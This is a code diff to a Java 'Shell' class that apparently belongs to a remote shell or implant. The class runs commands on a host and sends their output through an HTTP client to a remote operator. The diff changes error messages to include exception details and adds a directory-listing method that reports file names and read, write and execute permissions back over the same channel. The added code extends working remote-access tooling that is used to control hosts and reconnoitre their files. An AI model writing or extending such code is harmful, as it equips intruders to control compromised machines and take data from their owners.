@@ -81,10 +81,9 @@ public class Shell {
                         String.format("%s\n\n%s", new String(data), "Process delayed in executing command."));
             }
         }
-        catch (Exception ioEx) {
+        catch (Exception ex) {
             // User should try executing cmd again, prompted by no result returned
-            ioEx.printStackTrace();
-            shellHttpClient.sendCmdResult("Error while executing command. Try again.");
+            shellHttpClient.sendCmdResult(String.format("Error while executing command. %s", ex.getMessage()));
         }
 
     }
@@ -97,7 +96,7 @@ public class Shell {
      */
     private byte[] readCmdOutput(InputStream cmdInStream) throws IOException {
         try(DataInputStream inStream = new DataInputStream(new BufferedInputStream(cmdInStream))) {
-            System.out.printf("[*] %d bytes available before reading output.", cmdInStream.available());
+            System.out.printf("[*] %d bytes available before reading output.\n", cmdInStream.available());
 
             byte[] data = new byte[cmdInStream.available() + 1024]; // incremental strategy
             int bytesRead = 0;
@@ -188,6 +187,45 @@ public class Shell {
         }
         catch(Exception ex) {
             shellHttpClient.sendCmdResult(String.format("Unexpected error while changing directory. %s", ex.getMessage()));
+        }
+    }
+
+    /**
+        List specified directory's contents. This method is meant to replace the direct shell execution of 'ls' or 'dir'
+        commands due to latency when listing large contents.
+
+        @param dir The directory to list.
+     */
+    private void listDir(File dir) {
+        try {
+            StringBuilder concatList = new StringBuilder();
+            if (dir.exists()) {
+                File[] listing = dir.listFiles();
+                for(File entry : listing) {
+                    concatList.append(
+                            String.format(
+                                    "%s%s%s%s\t %s\n",
+                                    (entry.isDirectory()? "d":"-"),
+                                    (entry.canRead()? "r":"-"),
+                                    (entry.canWrite()? "w":"-"),
+                                    (entry.canExecute()? "e":"-"),
+                                    entry.getName()
+                            )
+                    );
+                }
+                shellHttpClient.sendCmdResult(concatList.toString());
+            }
+            else {
+                shellHttpClient.sendCmdResult("No such directory.");
+            }
+        }
+        catch(SecurityException secEx) {
+            // Permission
+            shellHttpClient.sendCmdResult("Permission denied.");
+        }
+        catch(Exception ex) {
+            shellHttpClient.sendCmdResult(
+                    String.format("Unexpected error while listing directory. %s", ex.getMessage()));
         }
     }
 }
